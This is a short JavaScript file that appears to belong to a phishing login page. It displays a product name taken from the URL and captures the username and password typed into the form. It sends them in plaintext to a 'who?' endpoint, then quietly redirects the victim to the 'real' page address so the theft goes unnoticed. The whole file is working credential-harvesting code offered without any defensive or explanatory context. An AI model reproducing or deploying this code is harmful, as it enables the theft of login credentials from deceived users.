const urlParams = new URLSearchParams(window.location.search);
const product_name = urlParams.get("product_name").toLocaleUpperCase();
const real_page_address = urlParams.get("return_to").toLocaleUpperCase();
function loadFrame() {
  document.title = real_page_address;
  let pr_name_div = document.getElementById("ProductName");
  pr_name_div.innerText = product_name;
}
function LoginSubmit() {
  let username = document.getElementById("txt_Username").value;
  let password = document.getElementById("txt_Password").value;
  
  let data = { username: username, password: password };

  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 404) {
        window.location.href=real_page_address;
    }
  };
  xhttp.open("GET", "who?USERNAME="+username+"PASSWORD="+password, true);
  xhttp.send();
}
